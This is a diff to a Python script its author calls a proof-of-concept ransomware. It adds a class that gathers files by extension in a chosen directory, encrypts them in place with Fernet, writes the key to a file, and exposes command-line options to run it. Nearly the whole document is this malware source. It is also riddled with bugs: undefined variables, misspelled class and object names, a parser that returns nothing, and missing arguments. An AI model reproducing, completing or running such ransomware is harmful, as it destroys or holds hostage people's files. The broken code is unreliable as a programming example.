@@ -7,7 +7,12 @@ Start Date : 2020-02-18
 End Date : 2020-02-..
 
 
-Description : 
+Description : This module is simply an example of a ransomware malware. *Warning*: This file is
+dangerous; encrypting your files and losing the key will be horrendous so please be very cautious 
+of the directory that is being encrypted when attempting to use this program. This program is just 
+another proof of concept. The files that are defined within the Ransomware class will be encrypted
+depending on the directory that is provided as an argument. The key generated will be stored into a file
+and can be retrieved using a class method. 
 
 
 		  ooo,    .---.
@@ -34,7 +39,7 @@ try:
 	# --> import tqdm for creating progress bars
 	import tqdm
 	# --> import pyfiglet for custom ASCII art fonts
-	import pyfiglet
+	from pyfiglet import Figlet
 	# --> Try importing cryptography module class
 	try:
 		from cryptography.fernet import Fernet, MultiFernet
@@ -51,20 +56,22 @@ try:
 except ImportError:
 	print('[-] There was an error importing a module')
 
-'''------------------------------------------------------------------------------------------------
-									Ransomware Class Definition
----------------------------------------------------------------------------------------------------'''
+
+'''
+****************************************************************************************************
+---------------------------------Ransomware Class Definition----------------------------------------
+****************************************************************************************************
+'''
 
 class Ransomware:
 
-	def __init__(self, directory='.', key_file='fernet_key.txt',action):
+	def __init__(self, action, directory='.', key_file='fernet_key.txt'):
 		'''
 		$ Declare encryption key variable
 		$ Get directory to encrypt/decrypt
 		$ Get name of file to store key
 		'''
-
-		print("[+] Initiating Ransomware constructor declarations")
+		print("[+] Invoking Ransomware constructor")
 		# --> Ferney key
 		self.key=None
 		# --> Fernet object
@@ -79,12 +86,12 @@ class Ransomware:
 		# --> Cryptographic action to perform
 		self.action=action
 
+
 	def get_valid_files(self, directory):
 		'''
 		$ Find files that contain the extension specified in our file_ext_target list
 		$ Returns a list that contains valid files to encrypt
 		'''
-
 		# --> List containing all files that end with the extensions
 		# --> Defined in the file_ext_target's list 
 		valid_files_to_encrypt = []
@@ -102,15 +109,15 @@ class Ransomware:
 		# --> return list of valid files
 		return valid_files_to_encrypt
 
-	def files_encrypt_or_decrypt(self, list_of_files, action):
+
+	def encrypt_or_decrypt(self, list_of_files):
 		'''
 		$ Opening all files in the list of files argument
 		$ and send the contents of these files to be encrypted
 		'''
-
 		progress_bar_info = ''
 		# --> If the action variable is set to encrypt
-		if action = 'encrypt':
+		if action == 'encrypt':
 			# --> Set the progress bar title to the following
 			progress_bar_info = 'Encrypting files'
 		# --> If the action variable is set to decrypt
@@ -118,7 +125,7 @@ class Ransomware:
 			# --> Set the progress bar title to the following
 			progress_bar_info = 'Decrypting files'
 
-		for file in tqdm(list_of_files,desc=progress_bar_info):
+		for file in tqdm(list_of_files, desc=progress_bar_info):
 			# --> open file for reading + writing
 			with open(file, 'rb+') as f:
 				# --> read the files contents
@@ -126,13 +133,13 @@ class Ransomware:
 				# --> If encrypt argument is True
 				if encrypt:
 					# ENCRYPT IT!!!!
-					encrypted = self.encrypt(file_content)
+					encrypted = self.encrypt_it(file_content)
 					# --> write encrypted data back into file
 					f.write(encrypted)
 				# --> If encrypt argument is False
 				else:
 					# DECRYPT IT!!!!
-					decrypted = self.decrypt(file_content)
+					decrypted = self.decrypt_it(file_content)
 					# --> write decrypted data back into file
 					f.write(decrypted)
 
@@ -147,13 +154,13 @@ class Ransomware:
 			f.write(self.key)
 
 
-	def get_key(self):
+	def get_key_from_file(self):
 		'''
 		$ Retrieve a key from a file
 		'''
 		self.key = open(self.keyfile,'r').read()
 	
-	def key_gen_fernet_instance(self):
+	def key_gen(self):
 		'''
 		$ Generate encryption/decryption key
 		$ Instantiate Fernet object
@@ -163,16 +170,17 @@ class Ransomware:
 		self.key = Fernet(Fernet.generate_key())
 
 		self.store_key()
-		# --> Fernet object instantiation
+		# --> Attempt to generate Fernet object
 		try:
-			# --> create Fernet object
+			# --> Fernet object instantiation
 			self.linear_b = Fernet(key)
 		except:
-			# --> if it fails
+			# --> If it fails
 			print('[-] Unable to instantiate Fernet object for encryption')
+		# --> Return Fernet key
+		return self.key
 
-
-	def encrypt(self, to_encrypt):
+	def encrypt_it(self, to_encrypt):
 		'''
 		$ Encrypting all files in the directory stored in the directory variable
 		'''
@@ -182,7 +190,7 @@ class Ransomware:
 		return self.linear_b.encrypt(to_encrypt)
 
 
-	def decrypt(self, to_decrypt):
+	def decrypt_it(self, to_encrypt):
 		'''
 		$ Decrypt all files in the directory stored in the directory variable
 		'''
@@ -190,57 +198,70 @@ class Ransomware:
 		# --> Return the decrypted data of an encrypted file
 		return self.linear_b.decrypt(to_decrypt)
 
-#%%%%%%%%% End Ransomware Class
+#%%%%%%%%%%%%%   End Ransomware Class
 
 def parse_arguments():
 	# --> Instantiate object for parsing arguments
-	parser = argpase.ArgumentParser(usage=f'usage: {sys.argv[0]} [-a] [-d] [-k]',
-									description='Passing arguments for our ransomware class')
+	parser = argparse.ArgumentParser(usage=f'usage: {sys.argv[0]} -a|--action -d|--directory [-k/--keyfile]',
+									description='Arguments for our Ransomware class')
 	# --> Create a group for arguments that are required
 	required = parser.add_argument_group('Required arguments')
-	# --> Create a group for argumetns that are optional
-	optional = parser.add_argument_group('Optional arguments')
+	# --> This argument will define the directory that will be encrypted or decrypted
+	required.add_argument('-d', '--directory', dest='directory', type=str, 
+						help='Directory of files to encrypt or decrypt',
+						required=True)
 	# --> This argument will define the cryption action (decrypt/encrypt)
-	optional.add_argument('-a', '--action', dest=action, type=str, 
+	required.add_argument('-a', '--action', dest='action', type=str, 
 						  help='Encrypt or decrypt files files',
 						  required=True, default='encrypt')
 	# --> This argument will define the absolute path to a file that has a key
 	# --> or will be used to store a key
-	optional.add_argument('-k', '--keyfile', dest=keyfile, type=str,
+	parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
 						  help='Enter the fullpath of a file with the encryption/decryption key',
 						  default=None)
-	# --> This argument will define the directory that will be encrypted or decrypted
-	parser.add_argument('-d', '--directory', dest=directory, type=str, 
-						help='Directory of files to encrypt or decrypt',
-						required=True)
 	# --> Retrieve arguments that were passed 
 	args = parser.parse_args()
 	print(args)
 	# --> return the arguments that were passed 
 
+
 def signature():
 	# --> creating ASCII art
-	result = pyfiglet.figlet_format("BinexisHATT", font="isometric1" ) 
-	print(result) 
+	result = Figlet(font='pagga') 
+	print(result.renderText('binexishatt')) 
+
 
 '''
 **************************************
 -----------------MAIN-----------------
 **************************************
 '''
-def initiate()
-	# --> Print my signature
+def initiate():
+	# --> Print signature
 	signature()
+	# --> parse input passed as arguments
+	parse_arguments()
 	# --> Get arguments
 	directory, action, keyfile = parse_arguments()
 	# --> If no key file was passed, use the default 
 	if keyfile == None:
 		# -->  Instantiate Ransomware object with no key file
-		instance = Ransonware(directory=directory,action=action)
+		Enigma = Ransonware(action=action,directory=directory)
 	# --> If keyfile is passed
 	else:
 		# --> Instantiate Ransomware object with key file
-		instance = Ransonware(directory=directory,keyfile=keyfile,action=action)
+		Enigma = Ransonware(action=action,directory=directory,keyfile=keyfile)
+	# --> Scan specified directory for files with valid extensions
+	valid_target_files = Enigma.get_valid_files()
+	'''
+	--> Obtianing Fernet key for encryption/decryption
+	--> Change this to key = Enigma.get_key() to retrieve key from
+		a file
+	'''
+	key = Enigma.key_gen()
+	# --> Encrypt or decrypt files based on the crytographic action
+	# --> that was passed as an argument
+	Enigman.encrypt_or_decrypt(valid_target_files)
 
 
 # --> Check if the current module is main module
